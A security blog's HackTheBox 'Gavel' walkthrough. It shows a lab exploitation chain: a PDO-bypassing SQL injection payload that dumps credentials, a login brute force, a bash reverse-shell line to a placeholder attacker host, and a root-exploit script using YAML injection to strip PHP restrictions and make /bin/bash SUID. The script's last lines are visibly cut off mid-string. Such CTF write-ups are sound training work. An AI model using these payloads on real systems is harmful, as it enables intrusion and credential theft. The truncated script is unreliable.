<!doctype html><html lang=en-us><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=generator content="Qubt theme for Hugo"><title>Hacking Articles</title>
<meta name=title content="Hacking Articles"><meta name=author content="Richie-Havoc"><meta name=description content="Expert ethical hacking tutorials, CTF writeups, and penetration testing guides. Learn cybersecurity through HackTheBox, TryHackMe walkthroughs."><meta name=google-adsense-account content="ca-pub-4834846196060641"><link type=text/css rel=stylesheet href=/css/main.bundle.min.c34ab593f7850b8e7984a77537a338f026bd2efcfe1715fbab66bda06475ab85.css integrity="sha256-w0q1k/eFC455hKd1N6M48Ca9Lvz+FxX7q2a9oGR1q4U="><script defer src=/js/main.bundle.min.5a00293bacd8510f50add105212cea76d541a955f6693035ef3128b638a21619.js integrity="sha256-WgApO6zYUQ9QrdEFISzqdtVBqVX2aTA17zEotjiiFhk="></script><link rel=apple-touch-icon sizes=180x180 href=/icon_hu74b16e164104d2d61e05b7604a924e01_486235_180x180_resize_box_3.png><link rel=icon type=image/png sizes=32x32 href=/icon_hu74b16e164104d2d61e05b7604a924e01_486235_32x32_resize_box_3.png><meta property="og:url" content="https://havocsec.me/pentesting/htb/hackthebox-gavel-walkthrough-linux--medium/"><meta property="og:site_name" content="Hacking Articles"><meta property="og:title" content="HackTheBox Gavel Walkthrough (Linux – Medium)"><meta property="og:description" content="This HackTheBox Gavel writeup provides a full walkthrough for the Linux Medium machine from Season 9.
it covers the entire exploitation chain, including enumeration, misconfiguration discovery, service abuse, gaining an initial foothold, and achieving root through privilege escalation.
This guide is designed for learners who want a clear, realistic, attacker-focused approach to solving HTB gavel machine  and improving their penetration testing skills."><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="pentesting"><meta property="article:published_time" content="2025-11-30T00:00:00+00:00"><meta property="article:modified_time" content="2025-11-30T00:00:00+00:00"><meta property="og:image" content="https://havocsec.me/thumbnail.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://havocsec.me/thumbnail.png"><meta name=twitter:title content="HackTheBox Gavel Walkthrough (Linux – Medium)"><meta name=twitter:description content="This HackTheBox Gavel writeup provides a full walkthrough for the Linux Medium machine from Season 9.
it covers the entire exploitation chain, including enumeration, misconfiguration discovery, service abuse, gaining an initial foothold, and achieving root through privilege escalation.
This guide is designed for learners who want a clear, realistic, attacker-focused approach to solving HTB gavel machine  and improving their penetration testing skills."><meta name=description content="Expert ethical hacking tutorials, CTF writeups, and penetration testing guides. Learn cybersecurity through HackTheBox, TryHackMe walkthroughs."><meta name=keywords content="hacking articles,hacking articles blog,hacking articles tutorials,hacking articles writeups,ethical hacking articles,cybersecurity articles,security hacking articles,penetration testing articles,infosec articles,cyber security hacking articles,cybersecurity,ethical hacking,CTF writeups,penetration testing,security research,bug bounty,offensive security,infosec,hackthebox,web exploitation,havoc,Richie havoc,htb,learn ethical hacking,hacking tutorials for beginners,cybersecurity tutorials,how to hack ethically,penetration testing course,security researcher blog,hacking step by step guide,ethical hacking examples,real world hacking scenarios,practical hacking exercises,Hercules,Soulmate,Darkcorp,Darkzero,Writeup,Bugbounty,htb writeups,hackthebox walkthrough,hackthebox solutions,penetration testing tutorials,linux privilege escalation,windows privilege escalation,active directory hacking,OSCP preparation,cyber security blog,vulnerability research,exploit development,reverse engineering,binary exploitation,pwn challenges,web security,network security,cryptography challenges,tryhackme,offsec labs,BoardLight HTB,Instant HTB,Sea HTB,Cicada HTB,Intuition HTB,Sightless HTB,Editorial HTB,Runner HTB,Greenhorn HTB,Blazorized HTB,Surveillance HTB,Headless HTB,Crafty HTB,Bizness HTB,Mist HTB,Usage HTB,Perfection HTB,Builder HTB,WifineticTwo HTB,Cap HTB,Analysis HTB,Keeper HTB,ctf challenges,capture the flag,cyber defense,red team operations,blue team defense,malware analysis,forensics challenges,steganography,OSINT techniques,kali linux tutorials,metasploit framework,burp suite tutorials,nmap scanning,sql injection,xss exploitation,privilege escalation techniques,buffer overflow,rop chain,shellcode development,reverse shell,web shell,docker security,kubernetes pentesting,cloud security,aws security,azure pentesting,api security testing,jwt exploitation,owasp top 10,security certifications,CEH preparation,OSWE preparation,OSCE preparation,NanoCorp HTB,NanoCorp walkthrough,NanoCorp writeup,NanoCorp HTB writeup,HTB NanoCorp exploitation,HTB NanoCorp solution,HackTheBox NanoCorp,NTLM relay attacks,NTLM relay exploitation,responder NTLM relay,ntlmrelayx tutorial,windows active directory exploitation,windows privilege escalation techniques,windows enumeration techniques,SMB relay attacks,credential discovery techniques,hard difficulty HTB machines,advanced windows hacking,active directory pentesting guide,windows security assessment,windows post exploitation,domain controller exploitation,kerberos attacks,pass the hash,lateral movement techniques,bloodhound enumeration,impacket tools,windows pentesting,HTB hard machines 2025,HTB season 9 machines,advanced AD attacks,HTB NanoCorp writeup,HTB NanoCorp Machine writeup,nanocorp.htb,CVE-2025-24071,HTB NanoCorp exploitation,DCOM exploitation,Windows DCOM attacks,DACL Abuse,best hacking articles website,top cybersecurity writeup blogs,where to find CTF writeups,detailed penetration testing tutorials,comprehensive hacking guides,step by step hacking tutorials,beginner to advanced ethical hacking,free hacking learning resources,cybersecurity blog 2025,latest hacking techniques,modern exploitation methods,practical security research,how to solve CTF challenges,how to hack hackthebox machines,privilege escalation methods explained,web application security testing,how to find vulnerabilities,penetration testing methodology,OSCP exam preparation tips,HTB machine walkthrough,CTF challenge solutions,security assessment guide,metasploit tutorials,burp suite guides,nmap cheat sheet,gobuster usage,hydra brute force,sqlmap injection,netcat reverse shell,wireshark packet analysis,john the ripper tutorial,hashcat cracking guide,OSCP certification preparation,CEH study materials,bug bounty hunter tips,cybersecurity career guide,penetration tester roadmap,ethical hacker certification,security researcher career path,infosec job preparation,2025 hacking tutorials,latest CVE exploits,zero day vulnerabilities,current cybersecurity threats,modern web exploitation,cloud security testing,API security vulnerabilities,container security hacking,AI security research,machine learning vulnerabilities,alternative to ippsec,similar to hackingarticles,best ctf writeup sites,top penetration testing blogs,ethical hacking resources,cybersecurity learning platforms,hacking practice labs,hacking community,infosec community blog,cybersecurity forum,ethical hacking discord,CTF community,bug bounty community,security researchers network"><meta name=author content="Richie-Havoc"><link rel=canonical href=https://havocsec.me/pentesting/htb/hackthebox-gavel-walkthrough-linux--medium/><meta name=google-site-verification content="5kNQmF94i_v9xe8c753YHZ660ypehgkIpd5I_5VOPL0"><meta name=msvalidate.01 content="FC9BD45C329063D600401FC9551479B8"><meta property="og:type" content="article"><meta property="og:url" content="https://havocsec.me/pentesting/htb/hackthebox-gavel-walkthrough-linux--medium/"><meta property="og:title" content="HackTheBox Gavel Walkthrough (Linux – Medium)"><meta property="og:description" content="Expert ethical hacking tutorials, CTF writeups, and penetration testing guides. Learn cybersecurity through HackTheBox, TryHackMe walkthroughs."><meta property="og:image" content><meta property="og:site_name" content="Hacking Articles"><meta property="og:locale" content="en_US"><meta property="article:published_time" content="2025-11-30T00:00:00Z"><meta property="article:modified_time" content="2025-11-30T00:00:00Z"><meta property="article:author" content="Richie-Havoc"><meta name=twitter:card content="summary_large_image"><meta name=twitter:url content="https://havocsec.me/pentesting/htb/hackthebox-gavel-walkthrough-linux--medium/"><meta name=twitter:title content="HackTheBox Gavel Walkthrough (Linux – Medium)"><meta name=twitter:description content="Expert ethical hacking tutorials, CTF writeups, and penetration testing guides. Learn cybersecurity through HackTheBox, TryHackMe walkthroughs."><meta name=twitter:image content><meta name=twitter:site content="@HavocRichie?t=smiK1Is6LAWykS9FlJg4eQ&amp;s=09"><meta name=twitter:creator content="@HavocRichie?t=smiK1Is6LAWykS9FlJg4eQ&amp;s=09"><meta name=robots content="index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1"><meta name=googlebot content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1"><meta name=bingbot content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1"><meta name=yandex content="index, follow"><meta name=baiduspider content="index, follow"><meta name=language content="English"><meta name=revisit-after content="7 days"><meta name=rating content="General"><meta name=tagline content="Advanced Ethical Hacking & Security Research Platform"><meta name=slogan content="Learn. Hack. Share. Repeat."><meta name=category content="Technology"><meta name=topic content="Cybersecurity, Ethical Hacking, Penetration Testing"><meta name=coverage content="Worldwide"><meta name=distribution content="Global"><meta name=target content="all"><meta name=audience content="Security Researchers, Ethical Hackers, CTF Players, Penetration Testers, Bug Bounty Hunters, Cybersecurity Students"><meta name=geo.region content="US"><meta name=geo.placename content="United States"><meta name=mobile-web-app-capable content="yes"><meta name=apple-mobile-web-app-capable content="yes"><meta name=apple-mobile-web-app-status-bar-style content="black-translucent"><meta name=apple-mobile-web-app-title content="Hacking Articles"><meta name=article:section content="pentesting"><meta name=article:subtitle content="A practical, detailed guide to exploiting the Gavel machine—covering enumeration, service abuse, and privilege escalation the right way."><meta name=article:summary content="This HackTheBox Gavel writeup provides a full walkthrough for the Linux Medium machine from Season 9.
it covers the entire exploitation chain, including enumeration, misconfiguration discovery, service abuse, gaining an initial foothold, and achieving root through privilege escalation.
This guide is designed for learners who want a clear, realistic, attacker-focused approach to solving HTB gavel machine  and improving their penetration testing skills."><meta property="article:publisher" content="https://havocsec.me"><meta name=publisher content="Hacking Articles"><meta name=copyright content="© 2025 Hacking Articles. All rights reserved."><meta name=alexaVerifyID content><meta name=norton-safeweb-site-verification content><meta name=thumbnail content><meta itemprop=name content="HackTheBox Gavel Walkthrough (Linux – Medium)"><meta itemprop=description content="Expert ethical hacking tutorials, CTF writeups, and penetration testing guides. Learn cybersecurity through HackTheBox, TryHackMe walkthroughs."><meta itemprop=image content><script type=application/ld+json>{"@context":"https://schema.org","@type":"HowTo","name":"HackTheBox Gavel Walkthrough (Linux – Medium)","description":"This HackTheBox Gavel writeup provides a full walkthrough for the Linux Medium machine from Season 9.\nit covers the entire exploitation chain, including enumeration, misconfiguration discovery, service abuse, gaining an initial foothold, and achieving root through privilege escalation.\nThis guide is designed for learners who want a clear, realistic, attacker-focused approach to solving HTB gavel machine  and improving their penetration testing skills.","image":"","datePublished":"2025-11-30T00:00:00Z","author":{"@type":"Person","name":"Richie-Havoc"},"publisher":{"@type":"Person","name":"Richie-Havoc"}}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https:\/\/havocsec.me\/"},{"@type":"ListItem","position":2,"name":"Pentesting","item":"https:\/\/havocsec.me\/pentesting/"},{"@type":"ListItem","position":3,"name":"HackTheBox Gavel Walkthrough (Linux – Medium)","item":"https:\/\/havocsec.me\/pentesting\/htb\/hackthebox-gavel-walkthrough-linux--medium\/"}]}</script><script async src="https://www.googletagmanager.com/gtag/js?id=G-M2657LXPFW"></script><script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-M2657LXPFW",{anonymize_ip:!0,send_page_view:!0})</script><meta name=htb-status content="active"><meta name=htb-retire content="2026-03-30"><meta name=htb-machine content="HackTheBox Gavel Walkthrough (Linux – Medium)"><script defer src=/js/htb-lock.min.8e60d76f7ed9b9c13cf2e4c3a5c793c6d1c62fe602afb5e4ef6143c03afca885.js integrity="sha256-jmDXb37ZucE88uTDpceTxtHGL+YCr7Xk72FDwDr8qIU="></script><link rel=stylesheet href=/css/htb-lock.min.189e4cc3c0aae97ea28bae651944806deba67932e2f485e2d05d9d4771ff1d07.css integrity="sha256-GJ5Mw8Cq6X6ii65lGUSAbeumeTLi9IXi0F2dR3H/HQc="><script>localStorage.getItem("color-theme")==="dark"||!("color-theme"in localStorage)&&window.matchMedia("(prefers-color-scheme: dark)").matches?document.documentElement.classList.add("dark"):document.documentElement.classList.remove("dark")</script></head><body class="flex h-screen flex-col justify-between bg-neutral-100 dark:bg-neutral-800"><div><header class="sticky top-0 z-10 bg-neutral-100 dark:bg-neutral-800"><section class="mx-auto flex max-w-(--breakpoint-xl) items-center justify-between p-4"><a href=https://havocsec.me/ class="flex items-center space-x-3"><img src=/logo_hu74b16e164104d2d61e05b7604a924e01_486235_filter_7015326143714700434.webp class="h-8 w-8" alt=Logo>
<span class="self-center whitespace-nowrap text-2xl font-semibold text-slate-700 dark:text-slate-400">Hacking Articles</span></a><div class="flex flex-row space-x-8"><nav class="hidden space-x-8 text-xl md:block" aria-label=main><a href=/ class="px-3 py-2 text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Home
</a><a href=/about/ class="px-3 py-2 text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Whoami
</a><a href=/blog/ class="px-3 py-2 text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Blog
</a><a href=/ctf/ class="px-3 py-2 text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">CTF
</a><a href=/pentesting/ class="px-3 py-2 text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Pentesting
</a><a href=/chitchat/ class="px-3 py-2 text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Chitchat</a></nav><button id=theme-toggle type=button class="rounded-lg text-sm text-slate-700 hover:text-indigo-500 dark:text-slate-400" aria-label=theme-switcher>
<svg id="theme-toggle-dark-icon" class="hidden h-6 w-6" fill="currentcolor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path d="M17.293 13.293A8 8 0 016.707 2.707a8.001 8.001.0 1010.586 10.586z"/></svg>
<svg id="theme-toggle-light-icon" class="hidden h-6 w-6" fill="currentcolor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path d="M10 2a1 1 0 011 1v1A1 1 0 119 4V3a1 1 0 011-1zm4 8a4 4 0 11-8 0 4 4 0 018 0zm-.464 4.95.707.707a1 1 0 001.414-1.414l-.707-.707a1 1 0 00-1.414 1.414zm2.12-10.607a1 1 0 010 1.414l-.706.707A1 1 0 1113.536 5.05l.707-.707a1 1 0 011.414.0zM17 11a1 1 0 100-2h-1a1 1 0 100 2h1zm-7 4a1 1 0 011 1v1a1 1 0 11-2 0v-1a1 1 0 011-1zM5.05 6.464A1 1 0 106.465 5.05l-.708-.707A1 1 0 004.343 5.757l.707.707zm1.414 8.486-.707.707a1 1 0 01-1.414-1.414l.707-.707a1 1 0 011.414 1.414zM4 11a1 1 0 100-2H3a1 1 0 000 2h1z" fill-rule="evenodd" clip-rule="evenodd"/></svg>
</button>
<button id=hamburger-button class="relative h-8 w-8 cursor-pointer text-3xl md:hidden" aria-label=hamburger-button><div class="absolute top-4 -mt-0.5 h-[3px] w-8 rounded-sm bg-slate-700 transition-all duration-500 before:absolute before:h-[3px] before:w-8 before:-translate-x-4 before:-translate-y-2.5 before:rounded-sm before:bg-slate-700 before:transition-all before:duration-500 before:content-[''] after:absolute after:h-[3px] after:w-8 after:-translate-x-4 after:translate-y-2.5 after:rounded-sm after:bg-slate-700 after:transition-all after:duration-500 after:content-[''] dark:bg-slate-400 dark:before:bg-slate-400 dark:after:bg-slate-400"></div></button></div></section><section id=mobile-menu class="absolute hidden w-full origin-top animate-open-menu flex-col justify-center bg-neutral-100 text-4xl dark:bg-neutral-800"><nav class="flex min-h-screen flex-col items-center py-8" aria-label=mobile><a href=/ class="px-3 py-2 text-center text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Home
</a><a href=/about/ class="px-3 py-2 text-center text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Whoami
</a><a href=/blog/ class="px-3 py-2 text-center text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Blog
</a><a href=/ctf/ class="px-3 py-2 text-center text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">CTF
</a><a href=/pentesting/ class="px-3 py-2 text-center text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Pentesting
</a><a href=/chitchat/ class="px-3 py-2 text-center text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Chitchat</a></nav></section></header><main><div class="justify-left mx-auto mt-8 flex max-w-(--breakpoint-md) px-4"><article><h1 class="text-4xl font-extrabold text-slate-700 dark:text-slate-200">HackTheBox Gavel Walkthrough (Linux – Medium)</h1><h2 class="mt-4 text-2xl text-slate-500 dark:text-slate-400">A practical, detailed guide to exploiting the Gavel machine—covering enumeration, service abuse, and privilege escalation the right way.</h2><div class="mb-4 mt-2 text-sm text-slate-500 dark:text-slate-400">Nov 30, 2025 - 4 minute read</div><div class="flex flex-col"><img class="mt-4 h-full w-full object-cover" src=/card_hu37377f0decc03288ad39234700a448ae_70593_filter_11492400015018413633.webp alt="feature image" height=593 width=736></div><span class="prose prose-slate break-words text-lg text-slate-700 dark:prose-invert prose-pre:max-w-[90vw] dark:text-slate-200 md:prose-pre:max-w-(--breakpoint-md) prose-code:before:hidden prose-code:after:hidden"><h1 id=hackthebox---gavel-writeup>HackTheBox - Gavel Writeup</h1><p><strong>Difficulty:</strong> Medium
<strong>OS:</strong> Linux (Ubuntu)
<strong>Author:</strong> HTB</p><h2 id=summary>Summary</h2><p>Gavel is a medium-difficulty Linux machine featuring an auction web application with multiple vulnerabilities. Initial access is achieved through SQL injection that bypasses PDO prepared statement protection, allowing extraction of admin credentials. After cracking the bcrypt hash, access to the admin panel enables Remote Code Execution via the <code>runkit_function_add()</code> PHP function. Privilege escalation involves exploiting a YAML injection vulnerability in a root-owned daemon process, bypassing PHP sandbox restrictions to obtain root access.</p><h2 id=reconnaissance>Reconnaissance</h2><h3 id=nmap-scan>Nmap Scan</h3><pre tabindex=0><code>nmap -sC -sV -oN nmap/initial TARGET_IP
</code></pre><blockquote></blockquote><p><img src=nmap.png alt="nmap scan for the machine"></p><h3 id=web-enumeration>Web Enumeration</h3><p>Adding <code>gavel.htb</code> to <code>/etc/hosts</code>:</p><p>Directory enumeration reveals an exposed <code>.git</code> repository:</p><pre tabindex=0><code>gobuster dir -u http://gavel.htb -w /usr/share/wordlists/dirb/common.txt
</code></pre><pre tabindex=0><code>/.git/HEAD            (Status: 200)
/admin.php            (Status: 302)
/assets               (Status: 301)
/index.php            (Status: 200)
/login.php            (Status: 200)
</code></pre><h2 id=git-repository-extraction>Git Repository Extraction</h2><p>Using git-dumper to extract the exposed repository: <a href=https://github.com/arthaud/git-dumper>https://github.com/arthaud/git-dumper</a></p><pre tabindex=0><code>git-dumper http://gavel.htb/.git/ ./gavel-git
cd gavel-git
git checkout .
</code></pre><h3 id=source-code-analysis>Source Code Analysis</h3><p><strong>Key Files Discovered:</strong></p><p>FilePurpose<code>inventory.php</code>SQL Injection vulnerability<code>includes/bid_handler.php</code>RCE via <code>runkit_function_add()admin.php</code>Auction rule management (requires auctioneer role)<code>includes/config.php</code>Database credentials: <code>gavel:gavel</code></p><h2 id=sql-injection---pdo-bypass>SQL Injection - PDO Bypass</h2><h3 id=vulnerable-code-inventoryphp>Vulnerable Code (inventory.php)</h3><pre tabindex=0><code>$sortItem = $_POST[&#39;sort&#39;] ?? $_GET[&#39;sort&#39;] ?? &#39;item_name&#39;;
$userId = $_POST[&#39;user_id&#39;] ?? $_GET[&#39;user_id&#39;] ?? $_SESSION[&#39;user&#39;][&#39;id&#39;];
$col = &#34;`&#34; . str_replace(&#34;`&#34;, &#34;&#34;, $sortItem) . &#34;`&#34;;

$stmt = $pdo-&gt;prepare(&#34;SELECT $col FROM inventory WHERE user_id = ? ORDER BY item_name ASC&#34;);
$stmt-&gt;execute([$userId]);
</code></pre><h3 id=the-challenge>The Challenge</h3><ul><li>The <code>sort</code> parameter is wrapped in backticks with backticks stripped</li><li>The <code>user_id</code> parameter uses PDO prepared statements with <code>?</code> placeholder</li><li>Traditional SQL injection appears blocked</li></ul><h3 id=the-bypass-technique>The Bypass Technique</h3><p><strong>Payload:</strong></p><pre tabindex=0><code>http://gavel.htb/inventory.php?user_id=x`+FROM+(SELECT+group_concat(username,0x3a,password)+AS+`%27x`+FROM+users)y;--+-&amp;sort=\?;--+-%00
</code></pre><pre tabindex=0><code>user_id=x` FROM (SELECT group_concat(username,0x3a,password) AS `&#39;x` FROM users)y;-- -
sort=\?;-- -%00
</code></pre><ol><li><strong><code>\?</code> breaks PDO parameter detection</strong> - PDO scans for <code>?</code> placeholders before parsing MySQL syntax. The backslash causes PDO to treat <code>\?</code> as an escaped literal, miscounting parameters.</li><li><strong><code>%00</code> null byte</strong> - Causes C-level string truncation in the MySQL driver, breaking prepared statement binding.</li><li><strong>Parameter binding fails</strong> - The <code>user_id</code> value is no longer safely bound and gets interpreted as raw SQL.</li><li><strong>Subquery executes</strong> - Returns concatenated credentials displayed as inventory items.</li></ol><h3 id=extracted-credentials>Extracted Credentials</h3><p>- During initial source code review, the string **“auctioneer”** appeared multiple times.</p><p>- This suggested that `auctioneer` was a valid username for the login form at `/login.php`.</p><p>Exploitation – Login Brute Force</p><blockquote><p><em>you can use any other bruteforcing tools like hydra, medusa, etc.to bruteforce the credentials and we got it right.</em></p><p><em>the username and password are;</em></p></blockquote><p><em>Username: auctioneer</em></p><p><em>Password: midnight1</em></p><p><img src=gaveladmin.png alt="after loging in to admin dash as auctioneer"></p><p>Logged in successfully as <strong>auctioneer.</strong></p><p>Navigated to the <strong>admin panel</strong>, where the rules parameter was vulnerable to <strong>Remote Code Execution (RCE).</strong></p><p>-Injected a reverse shell payload: create one from here; <a href=https://www.revshells.com/>https://www.revshells.com/</a></p><p><img src=gavel.webp alt="editing rules to get a reverse shell"></p><pre tabindex=0><code>system(&#39;bash -c &#34;sh -i &gt;&amp; /dev/tcp/&lt;attacker_ip&gt;/&lt;attacker_port&gt; 0&gt;&amp;1&#34;&#39;);
</code></pre><p>On the attacker machine start a listener mine i used penelope use one of your choice.</p><pre tabindex=0><code>penelope -p 4444 (default is 4444 so no need to specify the port if 4444 is not busy with onother listening)

(netcat listener)

nc -lvnp &lt;attacker_port&gt;
</code></pre><p><img src=shelluser.png alt="penelope shell cool right"></p><p>Reverse shell established.</p><p><img src=shelluser.png alt="penelope reverse shell image"></p><p>Got a shell as www.data and needed actioneer so i first changed directory to home <strong>Retrieved the user flag</strong> from $HOME.</p><p><img src=flaguser.png alt="user flag retrieval"></p><p>then Switched to the auctioneer user with su auctioneer.</p><p>became auctioneer and that is really cool</p><p><strong>Privilege Escalation</strong></p><p>Discovered /usr/local/bin/gavel-util could submit YAML files that were executed server‑side.</p><p>Crafted a malicious YAML to overwrite php.ini and remove restrictions (disable_functions, open_basedir):</p><p>used this script credits to user @845511915622629396 from discord</p><pre tabindex=0><code>```bash
#!/bin/bash
echo &#34;[*] Screw Gavel Root Exploit&#34;
echo &#34;[*] Stand-by...&#34;
WORKDIR=&#34;/tmp/pwn_$(date +%s)&#34;
mkdir -p &#34;$WORKDIR&#34;
cd &#34;$WORKDIR&#34;

echo &#34;[*] Step 1: Overwriting php.ini to remove disable_functions and open_basedir...&#34;
cat &lt;&lt; &#39;EOF_INI&#39; &gt; ini_overwrite.yaml
name: IniOverwrite
description: Removing restrictions
image: &#34;data:image/png;base64,AA==&#34;
price: 1337
rule_msg: &#34;Config Pwned&#34;
rule: |
  file_put_contents(&#39;/opt/gavel/.config/php/php.ini&#39;, &#34;engine=On\ndisplay_errors=On\nopen_basedir=/\ndisable_functions=\n&#34;);
  return false;
EOF_INI
/usr/local/bin/gavel-util submit ini_overwrite.yaml
echo &#34;[*] Config overwrite submitted. Waiting 5 seconds for stability...&#34;
sleep 5

echo &#34;[*] Step 2: Triggering system() to SUID /bin/bash...&#34;
cat &lt;&lt; &#39;EOF_SUID&#39; &gt; root_suid.yaml
name: RootSuid
description: Getting Root
image: &#34;data:image/png;base64,AA==&#34;
price: 1337
rule_msg: &#34;Shell Pwned&#34;
rule: |
  system(&#34;chmod u+s /bin/bash&#34;);
  return false;
EOF_SUID
/usr/local/bin/gavel-util submit root_suid.yaml

echo &#34;[*] Payload submitted. Checking /bin/bash permissions...&#34;
sleep 2

if ls -la /bin/bash | grep -q &#34;rws&#34;; then
    echo &#34;[+] SUCCESS! /bin/bash is now SUID root.&#34;
    echo &#34;[*] Spawning root shell and reading /root/root.txt ...&#34;
    /bin/bash -p -c &#39;cat /root/root.txt; exec /bin/bash -p&#39;
else
    echo &#34;[-] Exploit failed. /bin/bash is not SUID.&#34;
    echo &#34;[*] Trying alternative payload (copy bash)...&#34;

    cat &lt;&lt; &#39;EOF_COPY&#39; &gt; root_copy.yaml
name: RootCopy
description: Getting Root Alt
image: &#34;data:image/png;base64,AA==&#34;
price: 1337
rule_msg: &#34;Shell Pwned Alt&#34;
rule: |
  copy(&#39;/bin/bash&#39;, &#39;/tmp/rootbash&#39;);
  chmod(&#39;/tmp/rootbash&#39;, 04755);
  return false;
EOF_COPY
    /usr/local/bin/gavel-util submit root_copy.yam
    sleep 2

    if [ -f /tmp/rootbash ]; then
        echo &#34;[+] Alternative payload SUCCESS! /tm
        echo &#34;[*] Spawning root shell and reading 
        /tmp/rootbash -p -c &#39;cat /root/root.txt; e
    else
        echo &#34;[-] All attempts failed.&#34;
        exit 1
    fi
fi 
```
</code></pre><p>after running the bashscript above boom it spit the flag</p><p><img src=rootflag.png alt="root flag for gavel"></p><blockquote><p><em><strong>This was easy thats why it was not the intended way: Brute forcing the auctioneer login, exploiting RCE in the admin panel, and escalating via gavel-util.</strong></em></p><p><em><strong>The intended way was definitely SQL injection in inventory.php but you can use the path of your choice</strong></em></p></blockquote><p>-&ndash;</p><p><img src=final.png alt="fibal badge"></p><p>peace!!</p><p>HAPPY HACKING!!!!!!</p></span></article></div></main></div><footer><div class="flex flex-col justify-center p-10"><p class="text-center text-slate-700 dark:text-slate-400">&copy;
2025
Richie-Havoc</p><p class="text-center text-sm text-slate-700 dark:text-slate-400">Powered by <a class="hover:underline hover:decoration-indigo-500 hover:text-indigo-500" href=https://gohugo.io target=_blank rel="noopener noreferrer">Hugo</a> & <a class="hover:underline hover:decoration-indigo-500 hover:text-indigo-500" href=https://github.com/chrede88/qubt target=_blank rel="noopener noreferrer">Qubt</a></p></div></footer></body></html>